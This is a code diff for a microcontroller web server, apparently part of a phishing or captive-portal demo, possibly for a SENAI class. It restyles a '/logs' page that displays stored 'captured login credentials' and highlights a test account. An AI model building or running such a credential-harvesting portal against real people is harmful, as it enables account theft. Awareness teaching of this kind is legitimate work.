@@ -164,64 +164,63 @@ void setup() {
     blink(2);
   });
 
-  // Página de logs -OLD VERSION
-/*  server.on("/logs", []() {
-    webString = "<html><body><h1>Logs de Login</h1><pre>";
-    File f = SPIFFS.open(LOGFILE, "r");
-    if (f) {
-      serialString = f.readString();
-      webString += serialString;
-      f.close();
-    } else {
-      webString += "Nenhum log encontrado.";
-    }
-    webString += "</pre></body></html>";
-    server.send(200, "text/html", webString);
-  });
-*/
-
-
+ 
   // Página de logs
   server.on("/logs", []() {
-    webString = "<html><body>";
-    webString += "<h1>Logs de Login</h1><pre>";
+    webString = "<html><head><meta charset='UTF-8'></head><body>";
+    
+    // Título centralizado e maior
+    webString += "<h1 style='"
+              "text-align:center;"
+              "font-size:45px;"
+              "background-color:#3284d6;"       // Azul mundo senai
+              "color:white;"                    // Texto branco
+              "padding:20px;"
+              "border-radius:15px;"
+              "box-shadow: 0 4px 10px rgba(0,0,0,0.3);"
+              "font-family:Arial, sans-serif;"
+              "margin-bottom: 30px;"
+              "'>"
+              "Logs de Login"
+              "</h1>";
+
+    
+    // Início do bloco de logs com fonte maior
+    webString += "<pre style='font-size: 35px;'>";
 
     File f = SPIFFS.open(LOGFILE, "r");
     if (f) {
-      serialString = f.readString();
-      webString += serialString;
+      while (f.available()) {
+        String line = f.readStringUntil('\n');
+        line.trim(); // Remove espaços e \r \n extras
+
+        if (line == "Credenciais de login capturadas:") {
+          webString += "<span style='color:black; font-weight:bold;'>" + line + "</span>\n\n";
+        }
+        else if (line.indexOf("teste@mundosenai.com") >= 0) {
+          webString += "<span style='color:#fe2259; font-weight:bold;'>" + line + "</span>\n";
+        }
+        else {
+          webString += line + "\n";
+        }
+      }
       f.close();
     } else {
       webString += "Nenhum log encontrado.";
     }
+
     webString += "</pre>";
 
     // Botão para limpar os logs
-    webString += "<form action='/logs/clear' method='GET'>";
-    webString += "<button type='submit'>Limpar Logs</button>";
+    webString += "<form action='/logs/clear' method='GET' style='text-align:center; margin-top:20px;'>";
+    webString += "<button type='submit' style='font-size:20px;'>Limpar Logs</button>";
     webString += "</form>";
 
     webString += "</body></html>";
+
     server.send(200, "text/html", webString);
   });
 
-
-
-  // Página de respostas - OLD VERSION
-/*  server.on("/respostas", []() {
-    webString = "<html><body><h1>Respostas do Formulário</h1><pre>";
-    File f = SPIFFS.open(RESPOSTASFILE, "r");
-    if (f) {
-      serialString = f.readString();
-      webString += serialString;
-      f.close();
-    } else {
-      webString += "Nenhuma resposta encontrada.";
-    }
-    webString += "</pre></body></html>";
-    server.send(200, "text/html", webString);
-  });
-*/
 
 
   // Página de respostas
